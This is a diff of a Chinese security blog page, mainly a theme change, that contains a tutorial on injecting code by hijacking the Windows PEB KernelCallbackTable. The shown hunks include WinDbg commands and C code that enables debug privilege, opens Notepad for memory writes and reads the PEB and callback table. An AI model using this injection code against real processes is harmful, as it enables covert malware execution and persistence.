@@ -1,210 +1,287 @@
+
+
 <!DOCTYPE html>
-<html lang="en" color-mode="light">
+<html lang="en" data-default-color-scheme=auto>
 
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="author" content="Jentle" />
-  <!-- Open Graph Description 简短摘要-->
 
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
-  <script>
-    mermaid.initialize({
-      startOnLoad: true,
-      theme: 'default'
-    });
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jentle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目录[toc]  介绍攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。 这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。 在这篇博客中，我们将探">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用内核回调表进程注入">
+<meta property="og:url" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="TIPFactory">
+<meta property="og:description" content="目录[toc]  介绍攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。 这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。 在这篇博客中，我们将探">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png">
+<meta property="og:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png">
+<meta property="article:published_time" content="2024-11-12T08:55:48.000Z">
+<meta property="article:modified_time" content="2025-01-22T09:20:56.102Z">
+<meta property="article:author" content="Jentle">
+<meta property="article:tag" content="主机安全">
+<meta property="article:tag" content="进程注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png">
+  
+  
+  
+  <title>使用内核回调表进程注入 - TIPFactory</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
-      <!-- 用于搜索引擎的文章摘要 -->
-      
-            
-                
-                  <title>
-                    
-                      使用内核回调表进程注入
-                        
-                              
-                                    |
-                                    
-                                      TIPFactory
-                  </title>
-
-                  
-                    <link rel="apple-touch-icon" href="/images/dog2.jpg">
-                    <link rel="icon" href="/images/dog2.jpg">
-                    
-
-                      <!-- Raleway-Font -->
-                      <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
-
-                      <!-- hexo site css -->
-                      <link rel="stylesheet" href="/css/main.css" />
-                      <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
-                      <!-- 代码块风格 -->
-                      
-
-                            <!-- jquery3.3.1 -->
-                            
-                                <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
-                                
-
-                                  <!-- fancybox -->
-                                  
-                                      <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
-                                      <script defer type="text/javascript"
-                                        src="/plugins/jquery.fancybox.min.js"></script>
-                                      
-                                        
-<script src="/js/fancybox.js"></script>
-
-
-                                          
-                                            <!-- Global site tag (gtag.js) - Google Analytics -->
-                                            <script async
-                                              src="https://www.googletagmanager.com/gtag/js?id=G-2B5W7NCXEE"></script>
-                                            <script>
-                                              window.dataLayer = window.dataLayer || [];
-                                              function gtag() { dataLayer.push(arguments); }
-                                              gtag('js', new Date());
-
-                                              gtag('config', 'G-2B5W7NCXEE');
-                                            </script>
-                                            
-
-
-                                              
-                                                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                                                
-
-                                                  <script>
-                                                    var html = document.documentElement
-                                                    const colorMode = localStorage.getItem('color-mode')
-                                                    if (colorMode) {
-                                                      document.documentElement.setAttribute('color-mode', colorMode)
-                                                    }
-                                                  </script>
 <meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TIPFactory" type="application/atom+xml">
 </head>
 
-  <body>
-    <div id="app">
-      <div class="header">
-  <div class="avatar">
-    <a href="/">
-      <!-- 头像取消懒加载，添加no-lazy -->
-      
-        <img no-lazy src="/images/dog.gif" alt="">
-      
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
     </a>
-    <div class="nickname"><a href="/">打工人的自留地</a></div>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-  <div class="navbar">
-    <ul>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="使用内核回调表进程注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-12 16:55" pubdate>
+          November 12, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
       
-        <li class="nav-item" data-path="/">
-          <a href="/">Home</a>
-        </li>
-      
-        <li class="nav-item" data-path="/archives/">
-          <a href="/archives/">Archives</a>
-        </li>
-      
-        <li class="nav-item" data-path="/categories/">
-          <a href="/categories/">Categories</a>
-        </li>
-      
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">Tags</a>
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
-    </ul>
+    </div>
   </div>
 </div>
 
+</div>
 
-<script src="/js/activeNav.js"></script>
+  </header>
 
+  <main>
+    
+      
 
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-      <div class="flex-container">
-        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
-<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+    </div>
 
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-  <div class="container post-details" id="post-details">
-    <div class="post-content">
-      <div class="post-title">使用内核回调表进程注入</div>
-      <div class="post-attach">
-        <span class="post-pubtime">
-          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-01-22 17:20:56
-        </span>
-        
-              <span class="post-tags">
-                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">使用内核回调表进程注入</h1>
+            
+            
+              <div class="markdown-body">
                 
-                <span class="span--tag mr-8">
-                  <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" title="主机安全">
-                    #主机安全
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="进程注入">
-                    #进程注入
-                  </a>
-                </span>
-                
-              </span>
-          
-      </div>
-      <div class="markdown-body">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png" class="" title="POC">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png" class="" title="POC">
 
 <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[toc]</p>
 <hr>
@@ -245,14 +322,14 @@
 <p>dt ntdll！PEB系列</p>
 </li>
 <li><p>这将显示 PEB 结构及其字段，包括偏移量 +0x058 处的 KernelCallbackTable，显示 Kernel Callback Table 指针所在的位置。</p>
-<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png" class="" title="PEB structure"></li>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png" class="" title="PEB structure"></li>
 </ul>
 <ol start="2">
 <li><strong>找到内核回调表地址</strong></li>
 </ol>
 <ul>
 <li><p>识别出 PEB 中的 KernelCallbackTable 字段后，通过访问该字段直接找到其地址：</p>
-<pre><code>dt ntdll!PEB @$peb.KernelCallbackTable
+<pre><code class="hljs">dt ntdll!PEB @$peb.KernelCallbackTable
 </code></pre>
 </li>
 <li><p>此命令提供 PEB 中内核回调表的特定地址，该地址包含函数指针数组。</p>
@@ -279,7 +356,7 @@
 <p>DQS 0x00007ffa’29123070 L10</p>
 </li>
 <li><p>输出示例：</p>
-<pre><code>00007ffa`29123070  00007ffa`290c2bd0 user32!_fnCOPYDATA
+<pre><code class="hljs">00007ffa`29123070  00007ffa`290c2bd0 user32!_fnCOPYDATA
 00007ffa`29123078  00007ffa`2911ae70 user32!_fnCOPYGLOBALDATA
 00007ffa`29123080  00007ffa`290c0420 user32!_fnDWORD
 ...
@@ -295,7 +372,7 @@
 <p>一旦执行被劫持并执行有效负载，高级攻击者可能会将原始内核回调表恢复到其合法状态，以进一步逃避检测。</p>
 <h3 id="步骤-1-启用调试权限"><a href="#步骤-1-启用调试权限" class="headerlink" title="步骤 1 - 启用调试权限"></a>步骤 1 - 启用调试权限</h3><p>在一个进程可以操纵另一个进程的内存之前，出于测试目的，我需要启用一些调试权限。调试权限允许当前进程访问其他进程的敏感区域，这些区域对于内存读取和写入等任务是必需的。如果没有这些权限，Windows 安全性将限制对其他进程的访问，从而无法注入。</p>
 <p>EnableDebugPrivilege 函数通过修改当前进程的令牌以启用 SE_DEBUG_NAME 权限来提升权限。</p>
-<pre><code>void EnableDebugPrivilege() &#123;
+<pre><code class="hljs">void EnableDebugPrivilege() &#123;
 
     printf( &quot;[*] Enabling Debug Privilege...\n&quot; );
     HANDLE hToken;
@@ -319,7 +396,7 @@
 <li>AdjustTokenPrivileges 在令牌中设置权限以启用调试权限，从而允许进程对其他进程执行内存操作。</li>
 </ol>
 <h3 id="步骤-2-加载-NtQueryInformationProcess"><a href="#步骤-2-加载-NtQueryInformationProcess" class="headerlink" title="步骤 2 - 加载 NtQueryInformationProcess"></a>步骤 2 - 加载 NtQueryInformationProcess</h3><p>ntdll.dll 的 NtQueryInformationProcess 函数是一个低级别 Windows API 函数，它提供对有关进程的特定信息的访问，包括进程环境块 （PEB）。PEB 包含内核回调表等结构，该表存储指向各种回调函数的指针。此函数必须动态加载，因为它通常无法通过标准 Windows 标头访问。</p>
-<pre><code>typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
+<pre><code class="hljs">typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
 void LoadNtQueryInformationProcess( pNtQueryInformationProcess &amp;NtQueryInformationProcess ) &#123;
     printf( &quot;[*] Loading NtQueryInformationProcess...\n&quot; );
     HMODULE hNtdll = GetModuleHandleA( &quot;ntdll.dll&quot; );
@@ -339,7 +416,7 @@ void LoadNtQueryInformationProcess( pNtQueryInformationProcess &amp;NtQueryInfor
 <li>GetProcAddress 检索 NtQueryInformationProcess 的地址，以便稍后调用此函数以收集有关目标进程的详细信息。</li>
 </ul>
 <h3 id="步骤-3-—-启动-Target-流程"><a href="#步骤-3-—-启动-Target-流程" class="headerlink" title="步骤 3 — 启动 Target 流程"></a>步骤 3 — 启动 Target 流程</h3><p>进程注入首先创建一个 Notepad 实例，该实例将用作注入代码的目标。此示例使用 Notepad，因为它是一个简单、众所周知的应用程序，允许对注射过程进行受控测试。</p>
-<pre><code>STARTUPINFO si = &#123; sizeof( si ) &#125;;
+<pre><code class="hljs">STARTUPINFO si = &#123; sizeof( si ) &#125;;
 PROCESS_INFORMATION pi;
 
 printf( &quot;[*] Creating new Notepad process...\n&quot; );
@@ -354,7 +431,7 @@ printf( &quot;[+] Notepad process created successfully. PID: %d\n&quot;, pi.dwPr
 <li>CreateProcess 在新控制台中启动记事本，并将进程信息存储在 pi 中。生成的进程 ID （pi.dwProcessId） 是必不可少的，因为它标识了记事本进程，以便进行后续的内存操作。</li>
 </ul>
 <h3 id="第-4-步-—-找到目标窗口和进程-ID"><a href="#第-4-步-—-找到目标窗口和进程-ID" class="headerlink" title="第 4 步 — 找到目标窗口和进程 ID"></a>第 4 步 — 找到目标窗口和进程 ID</h3><p>该代码找到记事本的窗口句柄并检索其进程 ID。此句柄提供与 Notepad 的连接，从而可以打开句柄来操作其内存。</p>
-<pre><code>HWND hWindow = NULL;
+<pre><code class="hljs">HWND hWindow = NULL;
 DWORD waitTime = 0;
 const DWORD MAX_WAIT_TIME = 10000;
 
@@ -384,7 +461,7 @@ printf( &quot;[+] Process ID: %d\n&quot;, pid );
 <li>此进程 ID 对于打开句柄以直接访问 Notepad 的内存是必需的。</li>
 </ul>
 <h3 id="第-5-步-打开目标进程的句柄"><a href="#第-5-步-打开目标进程的句柄" class="headerlink" title="第 5 步 - 打开目标进程的句柄"></a>第 5 步 - 打开目标进程的句柄</h3><p>使用进程 ID，代码将打开记事本的句柄。此句柄允许直接访问进程的内存，这对于注入至关重要。</p>
-<pre><code>HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid );
+<pre><code class="hljs">HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid );
 if ( !hProcess ) &#123;
     printf( &quot;[-] Failed to open target process. Error: %d\n&quot;, GetLastError() );
     return -1;
@@ -396,7 +473,7 @@ printf( &quot;[+] Process Handle: 0x%p\n&quot;, hProcess );
 <li>OpenProcess 打开一个具有内存读取、写入和查询操作权限的句柄，允许注入器与记事本的内存交互。</li>
 </ul>
 <h3 id="步骤-6-检索-PEB-地址"><a href="#步骤-6-检索-PEB-地址" class="headerlink" title="步骤 6 - 检索 PEB 地址"></a>步骤 6 - 检索 PEB 地址</h3><p>NtQueryInformationProcess 用于检索目标进程的 PEB 地址。PEB 包含 Kernel Callback Table，这是此注入技术中修改的重点。</p>
-<pre><code>PROCESS_BASIC_INFORMATION pbi;
+<pre><code class="hljs">PROCESS_BASIC_INFORMATION pbi;
 ULONG returnLength;
 NTSTATUS status = NtQueryInformationProcess( hProcess, ProcessBasicInformation, &amp;pbi, sizeof( pbi ), &amp;returnLength );
 if ( status != 0 ) &#123;
@@ -411,7 +488,7 @@ printf( &quot;[*] PEB Address: 0x%p\n&quot;, PebBaseAddress );
 <li>NtQueryInformationProcess 填充 PROCESS_BASIC_INFORMATION 结构（包括 PebBaseAddress），从而提供对 PEB 的访问权限，以便进一步操作内核回调表。</li>
 </ul>
 <h3 id="第-7-步-读取内核回调表"><a href="#第-7-步-读取内核回调表" class="headerlink" title="第 7 步 - 读取内核回调表"></a>第 7 步 - 读取内核回调表</h3><p>使用 PEB 地址，代码读取 Kernel Callback Table 的内存地址，从而允许修改此表中的函数指针以控制回调。</p>
-<pre><code>PVOID KernelCallbackTable;
+<pre><code class="hljs">PVOID KernelCallbackTable;
 SIZE_T bytesRead = 0;
 if ( !ReadProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;KernelCallbackTable, sizeof( PVOID ), &amp;bytesRead ) ) &#123;
     printf( &quot;[-] Failed to read KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
@@ -424,7 +501,7 @@ printf( &quot;[*] KernelCallbackTable Address: 0x%p\n&quot;, KernelCallbackTable
 <li>ReadProcessMemory 在距 PEB 地址偏移量处访问 Kernel Callback Table，从而访问控制某些回调函数的指针。</li>
 </ul>
